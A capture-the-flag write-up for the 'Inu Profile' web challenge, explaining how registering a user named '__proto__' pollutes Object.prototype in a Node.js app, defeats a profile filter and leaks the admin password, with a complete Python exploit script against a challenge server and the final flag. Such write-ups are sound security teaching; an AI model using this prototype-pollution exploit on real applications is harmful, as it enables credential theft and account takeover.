@@ -1,0 +1,126 @@
+---
+title: 'Daily Alpacahack 2026 B-SIDE #1 - Inu Profile'
+description: 'Writeup for Inu Profile from Daily Alpacahack 2026 B-SIDE. A Web challenge involving Prototype Pollution in Node.js.'
+date: 2026-02-03
+tags: ['writeup', 'web', 'prototype-pollution', 'nodejs', 'fastify', 'alpacahack']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+**Challenge:** Inu Profile  
+**Category:** Web  
+**Objective:** Exploiting a Prototype Pollution vulnerability to leak the admin password and retrieve the flag.
+
+## Reconnaissance
+The application is a Node.js web app using the `fastify` framework. It allows users to:
+1.  **Register** (`/register`) with a username, password, and profile.
+2.  **Login** (`/login`).
+3.  **View Profile** (`/profile` or `/profile/:username`).
+4.  **Admin Endpoint** (`/admin`), which gives the flag if the user is logged in as `admin`.
+
+### Source Code Analysis
+Key files:
+- `index.js`: Main application logic.
+
+#### The Vulnerability
+The vulnerability lies in the `/register` endpoint logic:
+
+```javascript
+// index.js lines 92-97
+users[username] ??= { password, ...DEFAULT_PROFILE };
+
+// okay, let's update the database
+for (const key in profile) {
+    users[username][key] = profile[key];
+};
+```
+
+If a user registers with the username `__proto__`, the following happens:
+1.  `users["__proto__"]` accesses `Object.prototype` (which exists).
+2.  The `??=` operator sees that `users["__proto__"]` is not null/undefined, so it **skips** the assignment of the default object.
+3.  The loop iterates over the user-provided `profile` object.
+4.  `users[username][key] = profile[key]` becomes `Object.prototype[key] = profile[key]`.
+
+This allows us to write arbitrary properties to `Object.prototype`, causing **Prototype Pollution**.
+
+#### The Leak
+The application has a function `getFilteredProfile` that is supposed to filter out sensitive fields (like `password`) before sending the profile to the user.
+
+```javascript
+// index.js lines 47-54
+function getFilteredProfile(username) {
+    const profile = users[username];
+    const filteredProfile = Object.entries(profile).filter(([k]) => {
+        return k in DEFAULT_PROFILE; // default profile has the key, so we can expose this key
+    });
+    
+    return Object.fromEntries(filteredProfile);
+}
+```
+
+The filter relies on `k in DEFAULT_PROFILE`.
+- `DEFAULT_PROFILE` is a plain object: `{ 'avatar': '...', 'description': '...' }`.
+- The `in` operator checks for properties in the object **and its prototype chain**.
+- By polluting `Object.prototype` with a property named `password`, `key in DEFAULT_PROFILE` will return `true` when `key` is `'password'`.
+
+The admin user object (defined at startup) has a `password` property.
+```javascript
+let users = {
+    admin: {
+        password: crypto.randomBytes(16).toString('hex'),
+        // ...
+    }
+};
+```
+
+If we call `/profile/admin`, `getFilteredProfile('admin')` checks if `password` (from admin's object) is in `DEFAULT_PROFILE`. Thanks to our pollution, this check passes, and the admin's password is returned in the response.
+
+## Exploit Strategy
+1.  **Pollute**: Send a POST to `/register` with `username: "__proto__"` and `profile: { "password": "pwned" }`. This adds `password` to `Object.prototype`.
+2.  **Leak**: Send a GET to `/profile/admin`. The response will now contain the admin's password.
+3.  **Login**: Use the leaked password to login as `admin`.
+4.  **Flag**: Access `/admin` to get the flag.
+
+## Solution Script
+The following Python script automates the attack:
+
+```python
+import requests
+
+BASE_URL = "http://34.170.146.252:16573" 
+
+def exploit():
+    s = requests.Session()
+    
+    # 1. Pollute Prototype
+    print("[*] Polluting Object.prototype...")
+    s.post(f"{BASE_URL}/register", json={
+        "username": "__proto__",
+        "password": "123",
+        "profile": { "password": "1" } 
+    })
+    
+    # 2. Leak Password
+    print("[*] Leaking admin password...")
+    r = s.get(f"{BASE_URL}/profile/admin")
+    admin_password = r.json().get('password')
+    print(f"[+] Leaked Password: {admin_password}")
+    
+    # 3. Login
+    print("[*] Logging in as admin...")
+    s.post(f"{BASE_URL}/login", json={
+        "username": "admin",
+        "password": admin_password
+    })
+    
+    # 4. Get Flag
+    r = s.get(f"{BASE_URL}/admin")
+    print(f"[+] Flag: {r.json()['message']}")
+
+if __name__ == "__main__":
+    exploit()
+```
+
+## Flag
+`Alpaca{the_best_dog_in_the_world_is_custom-kun}`
